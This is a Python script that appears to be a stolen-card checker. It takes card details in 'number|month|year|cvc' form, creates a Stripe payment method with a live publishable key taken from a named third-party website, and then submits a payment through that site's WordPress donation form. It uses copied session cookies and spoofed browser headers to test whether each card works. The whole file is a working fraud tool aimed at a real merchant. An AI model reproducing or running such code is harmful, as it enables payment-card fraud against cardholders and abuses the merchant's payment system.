import requests, re


def Tele(ccx):
	import requests
	ccx = ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:  #Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	import requests

	headers = {
		'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'priority': 'u=1, i',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Brave";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'sec-gpc': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
	}

	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=601cd8db-e6ef-4aaa-9d76-ecea67bb9212d84347&muid=f7a35138-db40-4dd6-b76b-aeb51b7c541c39e90c&sid=5b9a8080-2823-4021-8b2d-3ba91fec7704647a82&pasted_fields=number&payment_user_agent=stripe.js%2F0f84b1fa11%3B+stripe-js-v3%2F0f84b1fa11%3B+card-element&referrer=https%3A%2F%2Fwww.carryonharry.com&time_on_page=89154&key=pk_live_51MjvVDJpIKhjU7dcoB4mV4iw7CiWku46WY2wFQV1chnikXIHWoUroZO4AyxRs8rVZCokaqrWpXIECteEYVnb3Wbf00vUIVwO0k'
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

	pm = r1.json()['id']

	import requests

	cookies = {
		'__stripe_mid': 'f7a35138-db40-4dd6-b76b-aeb51b7c541c39e90c',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-09-27%2003%3A09%3A22%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.carryonharry.com%2Fpost-your-interview-author%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2024-09-27%2003%3A09%3A22%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.carryonharry.com%2Fpost-your-interview-author%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F129.0.0.0%20Safari%2F537.36',
    '__stripe_sid': '5b9a8080-2823-4021-8b2d-3ba91fec7704647a82',
    'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.carryonharry.com%2Fpost-your-interview-author%2F',
	}

	headers = {
		'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '__stripe_mid=f7a35138-db40-4dd6-b76b-aeb51b7c541c39e90c; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-27%2003%3A09%3A22%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.carryonharry.com%2Fpost-your-interview-author%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-09-27%2003%3A09%3A22%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.carryonharry.com%2Fpost-your-interview-author%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F129.0.0.0%20Safari%2F537.36; __stripe_sid=5b9a8080-2823-4021-8b2d-3ba91fec7704647a82; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.carryonharry.com%2Fpost-your-interview-author%2F',
    'origin': 'https://www.carryonharry.com',
    'priority': 'u=1, i',
    'referer': 'https://www.carryonharry.com/post-your-interview-author/',
    'sec-ch-ua': '"Brave";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'sec-gpc': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
	}

	params = {
			't': '1727408664429',
	}

	data = {
		'data': '__fluent_form_embded_post_id=4889&_fluentform_15_fluentformnonce=04d3d665b9&_wp_http_referer=%2Fpost-your-interview-author%2F&names%5Bfirst_name%5D=&names%5Blast_name%5D=&email=&description=Wr&description_1=Gen&description_14=&description_5=Org&description_7=Hat&description_8=Fin&description_9=Rea&description_11=Com&description_17=&description_15=&description_18=&description_16=&description_19=&description_21=&description_20=&description_13=Stu&url=&url_2=&url_1=&url_3=&input_radio=no&payment_input=3&payment_method=stripe&payment-coupon_1=&input_text=Yes&__ff_all_applied_coupons=&item__15__fluent_checkme_=&__stripe_payment_method_id='+str(pm)+'',
    'action': 'fluentform_submit',
    'form_id': '15',
	}

	r2 = requests.post(
			'https://www.carryonharry.com/wp-admin/admin-ajax.php',
			params=params,
			cookies=cookies,
			headers=headers,
			data=data,
	)
	return (r2.json())
